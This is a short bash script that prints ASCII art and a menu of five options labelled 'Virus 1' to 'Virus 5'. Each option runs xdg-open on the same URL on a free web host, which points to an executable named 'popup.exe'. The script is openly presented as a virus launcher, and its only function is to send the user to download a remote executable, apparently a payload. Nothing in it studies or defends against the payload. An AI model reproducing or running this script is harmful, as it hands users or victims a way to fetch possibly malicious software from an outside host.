#!/bin/bash

while true; do
    clear
     # Function to display ASCII art
display_art() {
    echo "
                        ___......__             _
                        _.-'           ~-_       _.=a~~-_
--=====-.-.-_----------~   .--.       _   -.__.-~ ( ___===>
              '''--...__  (    \ \\\ { )       _.-~
                        =_ ~_  \\-~~~//~~~~-=-~
                         |-=-~_ \\   \\
                         |_/   =. )   ~}
                         |}      ||
                        //       ||
                      _//        {{
                   '='~'          \\_    =
                                   ~~'                                                  
"
}

# Display the ASCII art
display_art
    echo "Menu:"
    echo "1. Virus 1"
    echo "2. Virus 2"
    echo "3. Virus 3"
	echo "4. Virus 4"
	echo "5. Virus 5"
    echo "6. Exit"
    read -p "Select an option: " choice

    case $choice in
        1)
            echo "You selected: Virus"
            # Add code to run the other bash script here
            xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/popup.exe"  # Open link in default browser
            ;;
        2)
            echo "You selected: Virus"
            # Add code to run the other bash script here
            xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/popup.exe"  # Open link in default browser
            ;;
        3)
            echo "You selected: Virus"
            # Add code to run the other bash script here
            xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/popup.exe"  # Open link in default browser
            ;;
	    4)
            echo "You selected: Virus"
            # Add code to run the other bash script here
            xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/popup.exe"  # Open link in default browser
            ;;
		5)
            echo "You selected: Virus"
            # Add code to run the other bash script here
            xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/popup.exe"  # Open link in default browser
            ;;
        6)
            echo "Exiting..."
            exit
            ;;
        *)
            echo "Invalid choice. Please select a valid option."
            ;;
    esac

    # Wait for user input before clearing the screen and showing the menu again
    read -p "Press Enter to continue..."
done

